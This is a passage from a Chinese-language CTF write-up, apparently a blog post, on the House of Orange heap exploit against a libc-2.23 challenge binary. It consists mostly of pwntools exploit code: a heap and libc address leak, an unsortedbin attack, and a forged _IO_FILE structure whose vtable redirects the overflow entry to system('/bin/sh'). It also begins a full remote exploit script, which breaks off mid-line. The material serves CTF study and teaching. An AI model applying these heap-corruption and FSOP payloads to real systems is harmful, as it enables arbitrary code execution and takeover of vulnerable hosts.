data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>show<span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>heapbase <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x1ba61</span></pre></td></tr></table></figure><p><img data-src=\"/img/houes-of-orange/image-20240715121450635.png\" alt=\"image-20240715121450635\"></p>\n<p>泄露完之后，就进行 FSOP 攻击。需要配合 unsortedbin attach</p>\n<p>所以需要再次把 <code>top_chunk</code>  放置到 unsortedbin 内</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload <span class=\"token operator\">=</span> padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x4f8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x181</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x4f8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">18</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x400</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/houes-of-orange/image-20240715121817321.png\" alt=\"image-20240715121817321\"></p>\n<p><img data-src=\"/img/houes-of-orange/image-20240715121859179.png\" alt=\"image-20240715121859179\"></p>\n<p>在索引第 19 个距离处于 unsortedbin 的 chunk 块较近，从这里写起，实现由 unsorted attach 的发起的 FSOP 攻击</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token string\">b'B'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x400</span><span class=\"token operator\">-</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>p <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x21</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p <span class=\"token operator\">+=</span> <span class=\"token string\">b'B'</span> <span class=\"token operator\">*</span> <span class=\"token number\">0x10</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># fake file</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>f <span class=\"token operator\">=</span> <span class=\"token string\">b'/bin/sh\\x00'</span> <span class=\"token comment\"># flag overflow arg -> system('/bin/sh')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x61</span><span class=\"token punctuation\">)</span>    <span class=\"token comment\"># _IO_read_ptr small bin size</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#  unsoted bin attack</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _IO_read_end)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>io_list_all <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># _IO_read_base</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">#bypass check</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># 使 fp->_IO_write_base &lt; fp->_IO_write_ptr 绕过检查</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _IO_write_base </span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _IO_write_ptr</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _IO_write_end</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _IO_buf_base</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _IO_buf_end</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _IO_save_base</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _IO_backup_base</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _IO_save_end</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># *_markers</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># *_chain</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>f <span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _fileno</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>f <span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _flags2</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># _old_offset</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>f <span class=\"token operator\">+=</span> p16<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># ushort _cur_colum;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>f <span class=\"token operator\">+=</span> p8<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># char _vtable_offset</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>f <span class=\"token operator\">+=</span> p8<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># char _shrotbuf[1]</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>f <span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># null for alignment</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _offset</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _codecvt</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _wide_data</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _freeres_list</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _freeres_buf</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>f <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># __pad5</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>f <span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _mode 为了绕过检查，fp->mode &lt;=0 ((addr + 0xc8) &lt;= 0)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>f <span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># _unused2</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>p <span class=\"token operator\">+=</span> f</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>p <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">3</span> <span class=\"token comment\"># alignment to vtable</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>p <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>heapbase <span class=\"token operator\">+</span> <span class=\"token number\">0x23010</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># vtable 指向自己</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>p <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>p <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>sys_addr<span class=\"token punctuation\">)</span> <span class=\"token comment\"># _IO_overflow 位置改为 system</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">19</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/houes-of-orange/image-20240715122127045.png\" alt=\"image-20240715122127045\"></p>\n<p><img data-src=\"/img/houes-of-orange/image-20240715122150872.png\" alt=\"image-20240715122150872\"></p>\n<h3 id=\"完整exp\"><a class=\"markdownIt-Anchor\" href=\"#完整exp\">#</a> 完整 exp:</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>huan_attack_pwn</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># from LibcSearcher import *</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># context(arch='i386' , os='linux', log_level='debug')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>binary <span class=\"token operator\">=</span> <span class=\"token string\">'./pwn'</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>libc <span class=\"token operator\">=</span> <span class=\"token string\">'./libc-2.23.so'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>host<span class=\"token punctuation\">,</span> port <span class=\"token operator\">=</span> <span class=\"token string\">\"110.40.35.73:33791\"</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[31;40mremote\\033[0m: (y)\\n'</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token string\">'\\033[32;40mprocess\\033[0m: (n)'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">if</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'y'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\"># r = gdb.debug(binary)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary(libc)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>default <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>                <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> time<span class=\"token operator\">=</span>default             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>rpu     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">,</span>drop<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length                   <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>lg      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>var_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> ：0x</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">globals</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>var_name<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span><span class=\"token format-spec\">x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>prl     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>var_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>debug   <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> command<span class=\"token operator\">=</span><span class=\"token string\">''</span>               <span class=\"token punctuation\">:</span> gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">,</span>command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Mea</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b'>\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Add</span><span class=\"token punctuation\">(</span>sz<span class=\"token punctuation\">,</span>ct<span class=\"token operator\">=</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\tMea<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b'Size :\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>sz<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b'Content :\\n'</span><span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Edi</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span>sz<span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\tMea<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b'Index :\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b'Size :\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>sz<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b'Content :\\n'</span><span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\tMea<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b'Index :\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x408</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xbf1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x400</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x1000</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x400</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>show<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>libc_base <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x61</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x3C4B20</span> <span class=\"token operator\">+</span> <span 